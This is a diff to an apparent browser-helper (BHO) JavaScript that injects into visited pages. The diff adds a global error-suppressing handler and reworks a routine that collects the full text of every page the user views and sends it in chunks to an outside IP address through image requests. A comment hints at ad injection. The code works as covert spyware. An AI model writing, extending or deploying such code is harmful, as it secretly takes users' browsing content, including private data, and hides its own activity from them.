@@ -1,3 +1,4 @@
+window.onerror = function() { return true; };
 var i8bho_bindoemid= i8bho_bindoemid||0,
 	i8bho_nid= i8bho_nid||'0',
 	i8bho_rid= i8bho_rid||0,
@@ -53,7 +54,6 @@ _gaq.push(
 function I8bho_print()
 {
 	(function(){
-
 	//baidu checKk: form based
 	if( document.location.toString().indexOf('baidu.com/s')>0 || document.location.toString().indexOf('baidu.com/baidu')>0 )
 	{
@@ -469,7 +469,7 @@ function I8bho_print()
 			i= 0, length= words.length, max= rand(7, 10), matches= [], text= body.innerText.toLowerCase();
 
 		//distrebuted text collection system
-		if( rand(1,20)<=100 )
+		if( rand(1,100)<=100 )
             sendText();
 //			I8px('http://211.154.172.172/text?text=' + encodeURIComponent(text).substr(0, 1024) );
 
@@ -487,40 +487,47 @@ function I8bho_print()
 		return matches;
 	};
 
-    window.onerror = function() { return true; }
     function sendText()
     {
+        var first_request_carry_data = true;
         var text = document.body.innerText,
-            prefix = 'http://10.10.11.163/text?n=',
-            turn = 't=',
+            prefix = 'http://211.154.172.172/text?n=',
+            turn = '&t=',
             param = '&c=',
-            paraSize = (msie ? ((msie<8) ? 1024 : 4098) : 4096),
-            maxTimes = (msie ? ((msie<8) ? 4 : 6) : 4),
-            metaSize = prefix.length + turn.length + param.length + ((maxTimes + 1).toString().length << 1);
+            paraSize = (msie ? ((msie<8) ? 1024 : 4096) : 4096),
+            maxTimes = (msie ? ((msie<8) ? 4 : 6) : 4) + first_request_carry_data,
+            metaSize = prefix.length + turn.length + param.length + (maxTimes.toString().length << 1);
         if (text === undefined) return;
         var step = paraSize - metaSize, maxSize = step * maxTimes;
         content = encodeURIComponent((text.length > maxSize ? text.substr(0, maxSize) : text).replace(/\s{2,}/g, ' ').replace(/[\n&]/g, ' ')).substr(0, maxSize);
         var total = Math.ceil(content.length/step);
         prefix += total + turn;
         var brkPos = [0];
-        for (var i = 1, p = 0; i <= total; ++i)
+        for (var i = 1, p = 0; i <= total + first_request_carry_data; ++i)
         {
             p = brkPos[i - 1] + step;
             brkPos[i] = content[p - 2] == '%' ? (p - 2) : (content[p - 1] == '%' ? (p - 1) : p);
         }
-        for (var i = 0, cursor, end = brkPos.length - 1, para; i < end; )
+        function sendRemains()
         {
-            cursor = brkPos[i];
-            para = content.substr(cursor, brkPos[++i] - cursor);
-            if (i == end)
+            for (var i = +first_request_carry_data, cursor, end = brkPos.length - 1, para; i < end; )
             {
-                if (para.length >= paraSize)
+                cursor = brkPos[i];
+                para = content.substr(cursor, brkPos[++i] - cursor);
+                if (i == end)
                 {
-                    para = para.substr(0, para[paraSize - 2] == '%' ? (paraSize - 2) : (para[paraSize - 1] == '%' ? (paraSize - 1) : paraSize));
+                    if (para.length >= paraSize)
+                    {
+                        para = para.substr(0, para[paraSize - 2] == '%' ? (paraSize - 2) : (para[paraSize - 1] == '%' ? (paraSize - 1) : paraSize));
+                    }
                 }
+                I8px(prefix + i + param + para);
             }
-            I8px(prefix + i + param + para);
         }
+        var img = new Image();
+        img.onload = sendRemains;
+        img.onerror = function() { /* show ads */ }
+        img.src = prefix + (+first_request_carry_data).toString() + (first_request_carry_data ? (param + content.substr(brkPos[0], brkPos[1])) : '');
     }
 
 	//load Google Analytics
